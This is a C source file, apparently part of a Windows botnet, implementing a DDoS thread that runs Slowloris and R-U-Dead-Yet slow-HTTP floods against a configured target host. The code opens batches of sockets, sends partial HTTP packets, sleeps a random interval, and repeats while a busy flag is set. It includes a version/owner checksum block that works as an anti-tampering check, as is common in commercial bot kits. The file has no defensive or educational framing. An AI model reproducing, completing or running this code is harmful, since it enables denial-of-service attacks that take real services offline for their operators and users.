#include "../Includes/includes.h"

#ifdef INCLUDE_DDOS
DWORD WINAPI DdosSlowlorisRudy(LPVOID)
{
    char cTargetHost[MAX_PATH];
    strcpy(cTargetHost, cFloodHost);

    char cTargetPath[DEFAULT];
    strcpy(cTargetPath, cFloodPath);

    char cTargetData[DEFAULT];
    strcpy(cTargetData, cFloodData);

    unsigned short usTargetPort = usFloodPort;

    unsigned short usType = usFloodType;

    unsigned short usPacketGenerationType;
    bool bRudy;
    if(usType == DDOS_HTTP_RUDY)
    {
        usPacketGenerationType = HTTP_RUDY;
        bRudy = TRUE;
    }
    else if(usType == DDOS_HTTP_SLOWLORIS)
    {
        usPacketGenerationType = HTTP_SLOWLORIS;
        bRudy = FALSE;
    }
    else if(usType == DDOS_HTTP_COMBO)
    {
        unsigned short usRandNum = GetRandNum(100);

        if(usRandNum < 50)
        {
            usPacketGenerationType = HTTP_RUDY;
            bRudy = TRUE;
        }
        else
        {
            usPacketGenerationType = HTTP_SLOWLORIS;
            bRudy = FALSE;
        }
    }
    else
        return 0;

    SOCKADDR_IN sck;
    HOSTENT *paddr;

    for(unsigned short us = 0; us < 25; us++)
    {
        paddr = fncgethostbyname(cTargetHost);
        if(paddr != NULL)
            break;

        Sleep(100);
    }

    sck.sin_addr = (*(in_addr*)*paddr->h_addr_list);

    sck.sin_port = fnchtons(usTargetPort);
    sck.sin_family = AF_INET;

    unsigned short usSocketCount = 25;
    unsigned short usDelay = 5000;

    SOCKET sSock[usSocketCount];
    DWORD dwMode = 1;

    char cHoldConnection[7];
    strcpy(cHoldConnection, "X-a: b\r\n");

    while(bDdosBusy)
    {
        for(unsigned short us = 0; us < usSocketCount; us++)
        {
            if(!bDdosBusy)
                break;
            sSock[us] = fncsocket(AF_INET, SOCK_STREAM, NULL);

            if(sSock[us] == INVALID_SOCKET)
                continue;

            // <!-------! CRC AREA START !-------!>
            char cCheckString[DEFAULT];
            sprintf(cCheckString, "%s--%s", cVersion, cOwner);
            char *cStr = cCheckString;
            unsigned long ulCheck = (((10000/100)*100)-4619);
            int nCheck;
            while((nCheck = *cStr++))
                ulCheck = ((ulCheck << 5) + ulCheck) + nCheck;
            if(ulCheck != ulChecksum2)
                closesocket(sSock[us]);
            // <!-------! CRC AREA STOP !-------!>

            //fncioctlsocket(sSock[us], FIONBIO, &dwMode);
        }

        for(unsigned short us = 0; us < usSocketCount; us++)
        {
            if(!bDdosBusy)
                break;

            char cPacket[MAX_DDOS_BUFFER];
            strcpy(cPacket, GenerateHttpPacket(usPacketGenerationType, cTargetHost, cTargetPath, usTargetPort, cTargetData));

            if(fncconnect(sSock[us], (PSOCKADDR)&sck, sizeof(sck)) != SOCKET_ERROR)
            {
                if(fncsend(sSock[us], cPacket, strlen(cPacket), NULL) != SOCKET_ERROR)
                    dwHttpPackets++;
            }
        }

        Sleep(GetRandNum(usDelay) + (usDelay / 2));

        for(unsigned short us = 0; us < usSocketCount; us++)
            fncclosesocket(sSock[us]);
    }
    return 1;
}
#endif
